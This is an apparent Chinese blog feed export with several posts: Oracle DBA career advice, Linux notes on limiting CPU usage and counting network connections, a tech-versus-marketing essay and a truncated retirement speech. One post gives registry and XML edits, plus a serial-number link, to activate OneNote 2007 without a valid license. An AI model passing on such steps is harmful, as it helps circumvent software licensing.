–许多跨国家的城市有本地用户群，他们定期聚会讨论数据库相关的话题。假如可能，参加其中一个本地用户群。这将给你一个与他人相互交流的很好的方法。</p><p>我如何能够从一名DBA初学者变为一个具有中级水平的DBA？</p><p>你已经成为DBA一段时间了，你现在希望你的技术水平提高一阶么？下一步该怎么做？首先，往回看前面的部分，确认你已经完成了所有的步骤。彻底理解SQL语言是十分重要的。理解关系型数据库理论和掌握基本的数据库管理任务也是非常重要的。到如今，你应该阅读文档和其他书籍到已经郁闷了。假如没有，那么你还没准备好继续深造，增长你的DBA的技术水平。假如你已经准备好继续了，我已为你的继续深造准备了一些方法。</p><p>步骤#1: 学习操作系统和你的服务器硬件 – 正如我前面所说，数据库存在于操作系统和服务器硬件之上。理解这些组成部分如何工作是很必要的。你应该知道如何与特殊的操作系统相合。你如何删除或者编辑文件？假如你的操作系统是Unix，你应该掌握命令行以及Unix命令如何辅助你工作。对于运行在Windows或其他操作系统上而言也是一样的。你同时需要对服务器的硬件有一定的了解。物理内存和虚拟内存有什么区别？RAID是什么以及不同的级别是如何产生影响的？为什么数据库喜欢更多的物理硬盘而非一个大硬盘卷？你需要知道这些事情以便你能够容易的与系统管理员进行如何配置好你的服务器以便使它能够充分的支持数据库方面的交谈。</p><p>步骤#2: 学习应用程序设计因为它与数据库相关 – 如前面所述，数据库存在于操作系统与数据库应用程序之间。你真的需要这两者。SQL语言是如何帮助创建好的应用程序的？绑定变量是什么并且为什么他们很重要？Tom Kyte 写了一本非常好的书，在Oracle应用程序设计上给出了很好的建议。他的Expert One-on-one Oracle书可在 Wrox Press找到。我强烈推荐阅读此书。他详细的叙述了那些能够生成和破坏Oracle应用程序的东西。你需要知道这些，因为你的应用程序开发人员希望从你这里得到指导和数据库知识。学习任何与应用程序设计有关的知识。也许参加一个关于软件工程，操作系统或数据结构的课程班会有好处。</p><p>步骤#4: 取得认证 – 也许你的工作并不需要，但是取得认证一定对你有益。作为DBA的每一天里，你学到了许多新的和令人激动的事情。也许在你职业生涯的这段时间里，有几天你没学到任何新的东西。但你仍然有很多要学习。成为一名OCP（Oracle Certified Professional） DBA要求你必须已经学到了数据库管理所有方面的基础。我发现在OCP考试的学习过程中，我学到了在我工作中从未接触过的东西。一次我学到了我从未碰到过的一个特殊课题，在后来的日子里我就能够使用那个知识解决问题。假如我从为在OCP考试中学倒它，那么我永远也不会用那种特殊的方法去解决问题。这已经一次次的发生在我的面前。有的人可能会说认证实际上真的不值得。我要说它只会对你有益无害。所以，去取得认证吧！</p><p>步骤#5: 获得一个资源库 – 在前面的部分中，我指出每个DBA都应该在Technet上有个账号。这是你其中一个主要资源。但是同时还有许多其他资源。很多人共享他们的Oracle知识。假如你还没有开始，你应该用网络浏览器去搜索并收集很多Oracle资源。愿意的话，你可以从访问我的网站（<a href="http://www.peasland.net/" target="_blank" rel="noopener">http://www.peasland.net</a>）开始。下面是一些Oracle DBA必须了解得网站列表：</p><p>ü       Ask Tom – <a href="http://asktom.oracle.com/" target="_blank" rel="noopener">http://asktom.oracle.com</a></p><p>ü       Jonathan Lewis web site - <a href="http://www.jlcomp.demon.co.uk/" target="_blank" rel="noopener">http://www.jlcomp.demon.co.uk/</a></p><p>ü       Ixora (Steve Adams) – <a href="http://www.ixora.com.au/" target="_blank" rel="noopener">http://www.ixora.com.au</a></p><p>ü       Orapub – <a href="http://www.orapub.com/" target="_blank" rel="noopener">http://www.orapub.com</a></p><p>ü       Metalink (Oracle支持网站) – <a href="http://metalink.oracle.com/" target="_blank" rel="noopener">http://metalink.oracle.com</a></p><p>还有许多其它的好网站。</p><p>步骤#6: 开始在不同的新闻组和论坛上交流 – 也许你已经发现了他们，但假如现在你还没有那么是时候去开始了。有许多的新闻组和论坛可以回答你的任何Oracle问题。在Oracle群落里还有许多高手愿意和你共享他们的知识。你所要做的就是提问。下面是一个列表包含了可以开始交流的最好的因特网团体：</p><p>ü       Usenet newsgroups – comp.databases.oracle.server 和 comp.databases.oracle.misc 是两个可以交流的非常著名的世界性的新闻组。他们拥有大量的针对Oracle问题的交流卷宗。观看这些组的最好的方法式使用新闻广播员。但是假如你想通过基于web的方式访问，也可以通过Google搜索引擎搜索它。           (<a href="http://groups.google.com/groups?hl=en&amp;lr=&amp;ie=UTF-8&amp;group=comp.databases.oracle" target="_blank" rel="noopener">http://groups.google.com/groups?hl=en&amp;lr=&amp;ie=UTF-8&amp;group=comp.databases.oracle</a>)</p><p>ü       Quest Pipelines – 当他们在最开始还属于软件提供商RevealNet的时候，被称为the RevealNet Pipelines。现在，Quest购买了RevealNet 并且拥有Pipelines 。因为Pipelines是中等的，所以这些是我最喜欢的。你可以在这里找到Pipelines  (<a href="http://www.quest-pipelines.com/index.asp" target="_blank" rel="noopener">http://www.quest-pipelines.com/index.asp</a>)。</p><p>观察别人是如何经历考验和磨难的是一件好事。假如你有问题，可以自由的在群里提出来。假如你要提出问题，通常应该包括一些信息，比如你的Oracle版本和Oracle运行的平台。这些将会得到有很大的差别的答案。假如你忘记了，会有人提醒你！甚至你不用提问也可以从其他人的答案中学到许多知识。我已经记不得多少次我之所以能够解决问题完全是因为我记得其他人在新闻组里问过相同的问题。</p><p>我如何从一名具有中级水平的DBA转变为一名高级DBA?</p><p>好，作为DBA你已经坚持不懈的努力了很长时间。你感到自己已经准备好往前再走一步。成为一名高级DBA需要什么？下面的部分将帮助你走下去。&lt; xmlnamespace prefix =”o” /&gt;</p><p><strong>步骤**</strong>#1:<strong> </strong>阅读所有的文档<strong> </strong>–** Oracle文档通常并不是很容易阅读的。无数次，你翻阅文档只是为了要弄清整件事情。假如文档是最好的东西，那么那些站在你的书架里的Oracle书籍就不会有市场。但是文档确实包含了一些无法在任何其他地方找到的信息。例如，你无法找到每一个专门的INIT.ORA参数或V$视图的详细说明。书本上也许会涉及一部分，但是Oracle文档却包含它们所有。我遇到过一个非常厉害的高级DBA，他没有从头至尾的阅读过Oracle文档。这不是偶然的。Oracle文档是必须阅读的。也许到现在为止你已经读过Oracle概念指导十二遍了。但是当Oracle 10i发布了，你还要再次阅读。任何有关10i的新概念将在文档里记录。假如你真的想更上一层，那么，去阅读那些文档。不要逃避它。</p><p><strong>步骤**</strong>#2:<strong> </strong>成为一名专家<strong> </strong>–** Oracle数据库是一个非常复杂的东西。为了更上一层，你必须精通产品的许多组成部分。以备份与恢复开始。成为一名备份与恢复的专家。故意的破坏数据库然后察看如何恢复它。尝试以任何可能的方式破坏数据库然后查看还有没有可能恢复。你将彻底的理解备份与恢复的概念。在你成为了备份与恢复的专家以后，再去成为其他领域的专家。你会有无穷无尽的题目要去掌握。在你整个职业生涯中都保持如此。但是请记住，无论你有多么专业，在某些领域，某些人会在某些方面知道的比你多。不要带个人情绪。只是尽可能多的从那个人那里学到知识。</p><p><a href="http://www.ixdba.net/" target="_blank" rel="noopener"><strong>IXDBA.NET技术社区</strong></a>  </p><p><strong>Route #3:</strong> <strong>积极参加新闻组，论坛和用户组</strong> <strong>–</strong>  在前面，我提过为什么不同的新闻组和论坛是学习新知识的很好的地方。现在轮到你进行下一步并且去回答任何你能够回答的问题。你将会惊讶于在这过程中你能学到那么多！</p><p><strong>Route #4:</strong> <strong>写白皮书并且展示它们</strong> <strong>–</strong>  这与前面提到的方法类似。首先，共享你拥有的知识是很重要的。假如你的职业生涯已经走到这一步，那么从某种意义上讲，是离不开他人的贡献的。所以，现在是你为他人奉献的时候了。第二，当你企图共享你的信息的时候会有令人惊异的事情发生。在你要用清楚的，简练的语言表述问题以便其他人能够使用时，那些信息在你的头脑里经过了一个令人瞠目的过程。这个过程使你巩固了知识，这是无法通过其它方法进行的。所以在白皮书中共享那些信息，讨论会，以及新闻组和论坛都是你学习和使你的能力更上一层的非常好的方法。顺着这条路，你应该作两件事。第一，认识到你将会犯错误。其他人将会很高兴的指出那些错误，有时在某种意义上那并不是很好。不要企图掩藏你的错误。承认它们并从它们那里学习。第二，学会说你不知道答案而不是企图以欺骗的方式通过。人们早晚会知道你在企图蒙蔽他们。简单的告诉他们现在你对答案并不肯定，但你会在查到答案后回来告诉他们。假如你时刻谨记这两件事，你就不会违背你的诚实而且你将成长为一名职业的IT人。</p><p><strong>步骤**</strong>#5:<strong> </strong>成为解决<strong><strong>Oracle</strong></strong>问题的专家<strong>**–</strong> 高级DBA通常都是被看作是解决复杂的Oracle问题的人。你将会用到你所有的技术来解决许多问题，这些技术都是你的职业生涯中积累下来的。我前面提到的任何事都将会在解决问题的过程中用到；文档，书籍，新闻组，测试案例，和其它DBA都将辅助你解决问题。</p><p><strong>步骤**</strong>#6:<strong> </strong>成为性能调优的专家<strong>**–</strong> 高级DBA通常都是被看作是调整数据库和应用程序性能的人。假如你是高级DBA但是你却不能分析性能瓶颈，那么你的公司将会到别处寻找这些服务。</p><p><strong>步骤**</strong>#7:<strong> </strong>成为承载能力计划的专家<strong>**–</strong> 高级DBA通常都是被看作是根据数据增长量和交易增长来计划数据库承载能力的人。高级DBA需要在影响应用程序性能以前发现系统瓶颈。例如，DBA应该知道在数据库将可用的磁盘空间用完以前预置更多的磁盘空间。不密切关注承载能力计划将会导致生产数据库宕机。</p><p><strong>步骤**</strong>#8:<strong> </strong>密切关注新的技术<strong>**–</strong> 高级DBA应该对IT界的关数据库技术的未来有好的建议。有什么可用的技术可以帮助数据库？例如，学习存储领域网的优缺点以及如何把它们应用到数据库系统。有什么技术在不远的将来可以用，哪些能够帮助我们？例如，写这篇文章的时候，linux操作系统正在变得越来越流行。Lunix会给你的数据库操作系统平台带来些什么？它能为你的公司工作么？</p><p><strong>结论</strong></p><p>从获得第一份工作，到从一名初级的DBA成长成一名高级DBA，我希望这篇文章在如何度过你的职业生涯的各个阶段方面给了你一些建议。无论你现在处在你的DBA职业生涯的哪一阶段都可以用到这篇文章。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux下限制CPU使用率的3种方法</title>
      <link href="/2010/06/11/three-ways-to-limit-cpu-usage-under-linux/"/>
      <url>/2010/06/11/three-ways-to-limit-cpu-usage-under-linux/</url>
      <content type="html"><![CDATA[<p>1,apache本身的限制功能(RLimitCPU)</p><p><a href="http://www.wrensoft.com/forum/archive/index.php/t-12.html" target="_blank" rel="noopener">http://www.wrensoft.com/forum/archive/index.php/t-12.html</a></p><p>引用国外这个帖子</p><p>Ray03-19-2008, 05:20 AM<br>The PHP test can be used to show that the problem is evident, but it is not conclusive to prove that there is no limit put in place.</p><p>The reason is that it depends on how PHP is configured on the server. If the PHP scripting engine is setup as a CGI application which is forked by Apache, then the RLimit* operatives will apply and the PHP script can prove this. If they run within httpd however, the limits would not apply to the PHP engine.<br>这个限制将施于Apache子服务请求衍生出的进程，而不是Apache子进程本身。这个范围包括CGI脚本和SSI执行命令，但不包括所有从Apache父进程衍生出的进程。比如说管道日志。</p><p>如果不子进程不衍生进程,或非常占资源的这个进程不属于衍生出来的进程,那不就是没办法了吗?所以呀,这个办法不行地.</p><p>2,通过系统的 ulimit命令限制资源的使用</p><p>设置文件在:</p><p>/etc/security/limits.conf</p><p>比如:</p><p>xok_la           hard    cpu             1<br>xok_la           hard    fsize           50000<br>xok_la           hard    memlock         1000<br>xok_la           hard    nofile          50<br>xok_la           hard    nproc           50</p><p>这种方式限制是可以的,他是基于用户来限制的,可以限制内存,CPU占用时间,打开的文件数等等.前提是你要登陆到这个系统上.如果只是以这个用户来单独运行文件的话,就不行…….所以我还是要放弃.</p><p>3,安装CPU Usage Limiter for Linux</p><p>What is it?<br>cpulimit is a simple program that attempts to limit the cpu usage of a process (expressed in percentage, not in cpu time). This is useful to control batch jobs, when you don’t want them to eat too much cpu. It does not act on the nice value or other scheduling priority stuff, but on the real cpu usage. Also, it is able to adapt itself to the overall system load, dynamically and quickly.<br>可以限制程序使用CPU的百分比,而不是时间.很好,很舒服.</p><p>开始安装吧.</p><p>官方地址:<a href="http://cpulimit.sourceforge.net/" target="_blank" rel="noopener">http://cpulimit.sourceforge.net/</a></p><p>cd /root/install/<br>svn checkout <a href="https://cpulimit.svn.sourceforge.net/svnroot/cpulimit/trunk" target="_blank" rel="noopener">https://cpulimit.svn.sourceforge.net/svnroot/cpulimit/trunk</a> cpulimit<br>cd cpulimit<br>make<br>cp ./cpulimit /usr/sbin</p><p>如此简单,很愉快吧?</p><p>限制方法:</p><p>如果限制进程名,比如将httpd这个进程名的CPU限制在40%</p><p>cpulimit –exe httpd –limit 40<br>cpulimit –exe /usr/local/bin/httpd –limit 40</p><p>将pid为2960的进程的CPU限制在55%</p><p>cpulimit –pid 2960 –limit 55</p><p>慢慢对比top 命令那里的CPU变化.嘿嘿,有效果了吧?.</p><p>再来个完美的</p><p>自动限制当前进程使用CPU超过20%的进程,将他限制为10%<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cpulimit --pid \`ps aux|awk &apos;&#123;if($3 &gt; 20) print $2&#125;&apos;\` --limit 10</span><br><span class="line"></span><br><span class="line">cpulimit命令:</span><br><span class="line"></span><br><span class="line">Error: You must specify a target process, by name or by PID  </span><br><span class="line">Usage: cpulimit TARGET [OPTIONS...]  </span><br><span class="line">   TARGET must be exactly one of these:  </span><br><span class="line">      -p, --pid=N        pid of the process (implies -z)  </span><br><span class="line">      -e, --exe=FILE     name of the executable program file or absolute path name  </span><br><span class="line">   OPTIONS  </span><br><span class="line">      -l, --limit=N      percentage of cpu allowed from 0 to 100 (required)  </span><br><span class="line">      -v, --verbose      show control statistics  </span><br><span class="line">      -z, --lazy         exit if there is no suitable target process, or if it dies  </span><br><span class="line">      -h, --help         display this help and exit</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux网络连接状态检查</title>
      <link href="/2010/06/11/linux-network-connection-status-check/"/>
      <url>/2010/06/11/linux-network-connection-status-check/</url>
      <content type="html"><![CDATA[<p>统计连接数状态：  </p><p>[root@localhost conf]# netstat -n|awk ‘/^tcp/{++S[$NF]} END {for(a in S) print a,S[a]}’<br>LAST_ACK 173<br>SYN_RECV 35<br>CLOSE_WAIT 159<br>ESTABLISHED 152<br>FIN_WAIT1 29<br>FIN_WAIT2 10<br>CLOSING 39<br>TIME_WAIT 103</p><p><a href="http://a3linux.blogspot.com/2008/07/linux.html" target="_blank" rel="noopener">Linux网络连接状态检查！</a>  </p><p>检查linux的网络连接状态其实很简单，利用Linux内置的一些命令和SHELL的几个小技巧就可以完成看似复杂的检查任务，这也是Linux的魅力之一！<br>最基本的，<br>netstat -atn<br>该命令的解释是列出基于TCP协议(-t)的所有连接，并将通信双方以IP地址的（-n)的方式显示，而不是主机名！！<br>netstat -atn | cut -b 49-75 | grep -o -P “\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b” | sort | uniq -c | sort -n -r -k 1,7 | head -10<br>这行命令用来分析netstat的输出结果，最后得出的是目前处于连接中的不同的IP地址；这个命令在Ubuntu（cut -b 45-75)上不能实现，这是不同的Linux对于一些基本命令的实现不同（编译的选项和参数不一致），但是ubuntu上可以用下面的命令实现相似的功能，<br>netstat -atn | cut -b 45-75 | cut -d’:’ -f1 |sort | uniq -c | sort -n -r -k 1,7 | head -10<br>唯一的缺点是不用正则表达式的情况下title内容行也被放了进来，当然还可以用一些命令去除这些文字行，这里就不展开了！<br>netstat -atn |cut -b 77-90 ｜ sort | uniq -c 是列出每个连接的状态并统计！<br>对于netstat命令输出的分析其实还有很多方法，这儿就不再列举！<br>time tcpdump -ns 200 -c 100 ‘(dst port http or dst port https) and tcp[13] &amp; 2!=0’ | grep -o -P ‘\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,5}\s\&gt;’ | cut -d ‘.’ -f 1-4 | sort | uniq -c | sort -n -r -k 1,7 | head -25<br>这个命令是对于100个包中有多少个新连接请求的统计！运用了tcpdump抓取100个（－c 100）包，最后列出这些请求的IP地址。<br>这里只是两个简单的例子，还有很多命令组合运用的实例可以大大加快我们的工作效率，这些都只要合理运用Linux的命令就可以了！！</p><p>查看http进程数：</p><p>[root@localhost conf]# ps -ef|grep httpd|wc -l</p><p>结果 - 1 (因为包含了grep httpd这个进程)</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ps和top命令的%CPU含义</title>
      <link href="/2010/06/09/ps-and-top-command-cpu-meaning/"/>
      <url>/2010/06/09/ps-and-top-command-cpu-meaning/</url>
      <content type="html"><![CDATA[<p>一直以为ps命令中的”%CPU”也是指实时的CPU使用率，所以一直都用它来做cacti监控process的cpu使用率。但是上周发现有点不对，ps的”%CPU”与top或者vmstat 的”%CPU”不一样。</p><p>ps命令的man里面的解释：</p><p>CPU usage is currently expressed as the percentage of time spent running during the entire lifetime of a process. This is not ideal, and it does not conform to the standards that ps otherwise conforms to. CPU usage is unlikely to add up to exactly 100%.</p><p>top命令的man的解释：</p><p>k: %CPU – CPU usage<br>The task’s share of the elapsed CPU time since the last screen update, expressed as a percentage of total CPU<br>time. In a true SMP environment, if ‘Irix mode’ is Off, top will operate in number of CPUs. You toggle<br>‘Irix/Solaris’ modes with the ‘I’ interactive command.</p><p>我的理解是，top中的进程cpu使用率，是实时的CPU使用率，也就是</p><p>单位时间内进程使用的CPU时间/单位时间  </p><p>而ps命令中的cpu使用率，反映的是该进程启动以来使用系统资源的情况：</p><p>进程启动以来使用的CPU时间/进程启动以来的实际时间  </p><p>两者有很大的区别。<br>(上述所说的ps和top命令所在的操作系统是debian)。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>教你如何激活OneNote 2007的方法</title>
      <link href="/2010/06/04/how-do-you-activate-the-onenote-2007-method/"/>
      <url>/2010/06/04/how-do-you-activate-the-onenote-2007-method/</url>
      <content type="html"><![CDATA[<p>OneNote很不错吧，但是你不会激活它？呵呵，下面cwitter就教你激活OneNote 2007的方法：</p><p>1、使用序列码安装完毕（<a href="http://www.weste.net/2008/10-26/21122832217.html" target="_blank" rel="noopener">点击获得OneNote 2007安装序列号</a>）</p><p>2、关闭所有Office程序</p><p>3、开始 -&gt; 运行regedit -&gt; 打开注册表</p><p>4、找到HKEY_LOCAL_MACHINE\Software\Microsoft\Office\12.0\Registration</p><p>5、删除子键ProductName、DigitalProductID 及 ProductID关闭注册表             </p><p>6、找到C:\ProgramFiles\CommonFiles\MicrosoftShared\OFFICE12\OfficeSetup Controller\Proof.en\Proof.XML 文件<br>修改<optionref id="AlwaysInstalled">为 <optionref id="NeverInstalled"></optionref></optionref></p><p>7、保存关闭Proof.XML 文件</p><p>8、成功激活OneNote 2007</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>你会选择技术还是市场？(转载)</title>
      <link href="/2010/06/03/will-you-choose-technology-or-market-reproduced/"/>
      <url>/2010/06/03/will-you-choose-technology-or-market-reproduced/</url>
      <content type="html"><![CDATA[<p>前两天看有网友说很多人反馈技术是干活的，市场有做老板的潜质。<br>我就问自己：微软的比尔盖茨和苹果的乔布斯这样的人是做技术的还是做市场的？  </p><p>这两天跟个朋友讨论这个问题，朋友说你看身边的这些老板，一般都是市场和财务出身的。做市场的人有人脉，做财务的人懂资本运作。<br>为什么你身边的人都是这样的人做老板，而那些做技术的老板都看不见？  </p><p>大的层面上说，这就是中国的国情。对于世界来讲，中国是一个大市场。即使到中国来投资，其实也是为了赚中国人的钱。他们掌握的核心的技术，不是跑来跟你分享的，他们用技术来换你的不可再生的资源。<br>这时候，他们当然希望中国只有干活的基层技术人员和懂得把东西销售出去的市场人才。  </p><p>我们必须承认，同质的商品比拼的就是市场能力，劣质的商品更需要市场人才。所以在中国，市场人才最吃得开。因为中国存在了大量的价值低于价格的商品。我认识个香港人，他说我们超市里的东西非常贵啊！顺便就佩服了一下内地人的生存能力。  </p><p>张悟本的现象就是一个市场运作现象，绝对不是一个技术现象。就连很多医生都推荐给他的病人张悟本的书。连医生们都信了张的谎言，你说这市场的力量有多大？  </p><p>但是坏的东西是早晚要暴露的，比如前阵子热炒的紫砂煲问题。这个紫砂煲根本没有什么科技含量，但是那些老板们都赚翻了！  </p><p>还有防辐射产品，到现在没有哪家企业能拿出完整的证据证明它的有效性。  </p><p>所以这都是市场现象而已，虽然很复杂但没有什么技术含量。  </p><p>越是复杂的问题，我们越要回归的原点来重新理解。中国自古重农轻商，认为农是本，商是末，其实是一种回归原点看待问题的方法。  </p><p>到底是什么推动了现代人类社会的发展？当然是技术革命！  </p><p>前几年大家都抵制日货，我们能真正抵制日货么？连全世界都抵制不了。因为日本在很多高精技术上的成就被我们大量的使用。你知道我们用的手机、照相机和电脑里面有多少是日本的技术和零部件？我们不买日本牌子的东西就能不为日本做经济贡献了？ 这也是对市场的简单理解，不是对技术的理性理解！  </p><p>我们现在大量的使用的从生活用品到高端产品，你知不知道我们为使用这些东西在为全世界的哪些发达国家每天都在支付大量的专利等知识产权费用！  </p><p>要想抵制日货，除非你在技术上超过日本，然后就轮到日本人简单的在市场上抵制中国货了！  </p><p>大的层面上反应出的问题，我们的生活和工作上就会体现出来。  </p><p>看看那些IT精英们多风光。其实我就不以为然。现在中国IT产业整个就构架在美国的技术与知识产权基础上。开发软件用的是人家的环境，用的是人家的工具，用的是人家的设备，用的是人家的认证体系，这些都是成本。然后开发出来的东西这些成本还是要转嫁在中国人自己头上的。  </p><p>为什么说干技术的是干活的？就是这个原因。在外企里，哪个做技术的敢说自己掌握了人家的核心技术，如果没有掌握核心技术，那不是干活的是什么？  </p><p>在看看那些老板多风光。你一样可以不以为然，他们的原始积累有多肮脏马克思100多年前就告诉你了！而市场人员了，天天客户需求客户满意的都是狗屁，真正的目的凯恩斯也早就告诉你了！因为中国的市场大，因为中国的市场层次多，因为中国的市场初级，因为中国的市场不规范，自然给做市场的人很大的空间。  </p><p>好吧，我再缩小一下范围。很多回复的网友经常把市场和销售做混淆，其实中国大部分的人在做销售不是做市场。很多老板也是TOPSALES出身，说他们狗屁是因为他们很懂销售策略，精力旺盛，百折不挠，但实际上根本不懂市场。所以会把假冒伪劣的东西搞的神乎其神，推销给不需要的消费者。而且还翻过头来大骂懂市场的懂技术的人，这就是现状。还宣扬搞市场就是搞关系云云。  </p><p>以上说的很乱，我整理一下：<br>一、我们中国的市场很大，是全世界都要争夺的战略要地，同时这也是我们的优势。<br>二、我们还很落后，不要大谈技术和市场，因为都控制在人家的手里。<br>三、我们还能有作为，国际接轨不是说向人家掏钱买标准和技术，我们自己可以研究标准和技术。<br>四、人生规划不要用地位和金钱作为标准，要理性看待自己到底有多少分量，自己适合做什么！<br>五，如果中国可以出现比尔盖茨和乔布斯这样的人，学技术和学市场都没关系，说明我们已经有了基础。  </p><p>题外话，美国的经济危机我认为是创新缺乏的危机，不是次贷危机，次贷危机不过是引子和现象。创新的缺乏造成了美国的技术供应不足，反过来消费没有下降，就是说只有花钱的渠道，没有赚钱的渠道。其实这是我们的机会，日本可以在某些技术领域上超过美国，我们同样可以。世界离不开中国，但也离不开美国，地球要共享不是争夺。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>孙振耀退休演讲</title>
      <link href="/2010/06/03/sun-zhenyao-s-retirement-speech/"/>
      <url>/2010/06/03/sun-zhenyao-s-retirement-speech/</url>
      <content type="html"><![CDATA[<p>如果这篇文章没有分享给你，那是我的错。<br>如果这篇文章分享给你了，你却没有读，继续走弯路的你不要怪我。<br>如果你看了这篇文章，只读了一半你就说没时间了，说明你已经是个“茫”人了。<br>如果你看完了，你觉得这篇文章只是讲讲大道理，说明你的人生阅历还不够，需要你把这篇文章珍藏，走出去碰几年壁，头破血流后再回来，再读，你就会感叹自己的年少无知。<br>如果你看完了，觉得很有道理，然后束之高阁，继续走进拥挤的地铁，依然用着自己昨日的观念来思考自己的未来，你的人生也将继续重复着昨日的状况。<br>如果你看完了，觉得那是一个过来人，对你的人生忠告，并你也愿意用他告诉你的思想去指导自己今后的生活，对你来讲成功不是很难，难的是你是否可以用这篇文章里的思想一直鞭策自己。<br>如果你看完了，觉得那是一个长辈用他的一生的时间来写的一篇对你忠告的文章，说明你已经有了和他相似的人生阅历，只要你继续努力，成就伟业并不难，难的是你是否可以把自己的人生经验和他人分享呢？<strong>体验决定深度，知识决定广度?</strong> 你的人生是什么呢？  </p><p>虽然离开惠普仅有十五天，但感觉上惠普已经离我很远。我的心思更多放在规划自己第二阶段的人生，这并非代表我对惠普没有任何眷恋，主要还是想以此驱动自己往前走。<br>万科王石登珠穆朗玛峰的体验给我很多启发，虽然在出发时携带大量的物资，但是登顶的过程中，必须不断减轻负荷，最终只有一个氧气瓶和他登上峰顶。登山如此，漫长的人生又何尝不是。<br>我宣布退休后，接到同事朋友同学的祝贺。大部分人都认为我能够在这样的职位上及年龄选择退休，是一种勇气，也是一种福气。  </p><p>还有一部分人怀疑我只是借此机会换个工作，当然还有一些人说我在HP做不下去了，趁此机会离开。<br>我多年来已经习惯别人对我的说三道四，但对于好友，我还是挺关心大家是否真正理解我的想法，这也是写这篇文章的目的。<br>由于受我父亲早逝的影响，我很早就下定决心，要在有生之年实现自己的愿望，我不要像我父亲一样，为家庭生活忙碌一辈子，临终前感伤，懊恼自己有很多没有实现的理想。<br>一本杂志的文章提到我们在生前就应该思考自己的墓志铭，因为那代表你自己对完美人生的定义，我们应该尽可能在有生之年去实现它。<br>我希望我的墓志铭上除了与家人及好友有关的内容外，是这样写着：<br>1.这个人曾经服务于一家全球最大的IT公司（HP）25年，和她一起经历过数次重大的变革，看着她从以电子仪表为主要的业务变革成全球最大的IT公司。<br>2.这个人曾经在全球发展最快的国家（中国）工作16年，并担任HP中国区总裁7年，见证及经历过中国改革开放的关键 最新突破阶段，与中国一起成长。<br>3.这个人热爱飞行，曾经是一个有执照的飞行员，累积飞行时数超过X小时，曾经在X个机场起降过。<br>4. 这个人曾经获得管理硕士学位，在领导管理上特别关注中国企业的组织行为及绩效，并且在这个领域上获得中国企业界的认可。<br>我费时25年才总结1和2两项成果，我不知还要费时多久才能达成3和4的愿望，特别是第4个愿望需要经历学术的训练，才能将我的经验总结成知识。<br>否则我的经验将无法有效影响及传授他人。因此重新进入学校学习，拿一个管理学位是有必要的，更何况这是我一个非常重要的愿望。<br>另一方面，我25年的时间都花在运营(operation) 的领域，兢兢业业的做好职业人士的工作，它是一份好工作，特别是在HP，这份工作也帮助我建立财务的基础，支持家庭的发展。<br>但是我不想终其一生，都陷入在运营的领域，我想象企业家一样，有机会靠一些点子 (ideas)赚钱，虽然风险很高，但是值得一试，即使失败，也不枉走一回，这也是第4个愿望其中的一部份。<br>Carly Fiorina 曾经对我说过“这个世界上有好想法的人很多，但有能力去实现的人很少”，2007 年5月21日在北大演讲时，有人问起那些书对我影响较大，我想对我人生观有影响的其中一本书叫“Trigger Point”，它的主要观点是：人生最需要的不是规划，而是在适当的时机掌握机会，采取行动。<br>我这些愿望在我心中已经酝酿一段很长的时间，开始的时候，也许一年想个一两次，过了也就忘掉，但逐渐的，这个心中的声音，愈来愈大，出现的频率也愈来愈高，当它几乎每一个星期都会来与我对话时，我知道时机已经成熟。<br>但和任何人一样，要丢掉自己现在所拥有的，所熟悉的环境及稳定的收入，转到一条自己未曾经历过，存在未知风险的道路，需要绝大的勇气，家人的支持和好友的鼓励。有舍才有得，真是知易行难，我很高兴自己终于跨出了第一步。<br>我要感谢HP的EER提前退休优惠政策，它是其中一个关键的Trigger Points,另一个关键因素是在去年五六月发生的事。<br>当时我家老大从大学毕业，老二从高中毕业，在他们继续工作及求学前，这是一个黄金时段，让我们全家可以相聚一段较长的时间，我为此很早就计划休一个长假，带着他们到各地游玩。<br>但这个计划因为工作上一件重要的事情（Mark Hurd 访华）不得不取消。这个事件刺激了我必须严肃的去对待那心中的声音，我会不会继续不断的错失很多关键的机会?<br>我已经年过50，我会不会走向和我父亲一样的道路？人事部老总Charles跟我说，很多人在所有对他有利的星星都排成一列时，还是错失时机。<br>我知道原因，因为割舍及改变对人是多么的困难，我相信大部分的人都有自己人生的理想，但我也相信很多人最终只是把这些理想当成是幻想，然后不断的为自己寻找不能实现的藉口，南非前总统曼德拉曾经说过，“与改变世界相比，改变自己更困难”，真是一针见血。<br>什么是快乐及有意义的人生？我相信每一个人的定义都不一样，对我来说，能实现我墓志铭上的内容就是我的定义。<br>在中国惠普总裁的位置上固然可以吸引很多的关注及眼球，但是我太太及较亲近的好友，都知道那不是我追求的，那只是为扮演好这个角色必须尽力做好的地方。<br>做一个没有名片的人士，虽然只有十多天的时间，但我发现我的脑袋里已经空出很多空间及能量，让我可以静心的为我Chapter 